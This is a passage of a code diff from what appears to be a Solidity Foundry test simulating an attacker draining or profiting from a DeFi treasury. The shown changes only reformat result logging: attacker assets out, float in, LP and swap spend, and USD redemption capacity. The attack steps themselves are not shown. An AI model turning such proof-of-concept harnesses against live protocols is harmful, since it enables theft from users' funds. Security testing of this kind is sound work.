         } else {
-            console2.log("  close FAILED (treasury cannot fund the settlement)");
+            console2.log("  close FAILED: the treasury cannot fund settlement");
             _logReason(cret);
         }
 
-        console2.log("");
-        console2.log("== result");
-        console2.log("  ipTokens left", ipBal);
-        console2.log("  assets returned to attacker (raw)", left);
-        console2.log("  assets returned to attacker (wad)", _wad(left, p.decimals));
-        console2.log("  spent from the float (wad)", spent);
-        console2.log("  capital provided to the test (wad)", float0);
+        // ---- 8. result
         (uint256 idle2, uint256 vault2) = _cash(p);
         (uint256 depth2,) = _depth(p);
+        console2.log("");
+        console2.log("== result");
+        console2.log("  attacker assets out (wad)", _wad(left, p.decimals));
+        console2.log("  attacker float  in (wad)", _wad(float0, p.decimals));
+        console2.log("  spent on LP+swap   (wad)", spent);
         console2.log("  treasury idle after (wad)", idle2);
-        console2.log("  vault after (wad)", vault2);
-        console2.log("  LP balance after (wad)", depth2);
-        console2.log("  rate after everything", _rate(p));
-
-        // net = final balance - the float handed out, i.e. returns minus outlay
+        console2.log("  vault after         (wad)", vault2);
+        console2.log("  LP balance after    (wad)", depth2);
+        console2.log("  LP balance after USD", _usd(p, depth2));
+        console2.log("  redemption capacity USD", _usd(p, idle2 + vault2));
         uint256 net = left > float0 ? left - float0 : 0;
         uint256 neg = left > float0 ? 0 : float0 - left;
         if (net > 0) {
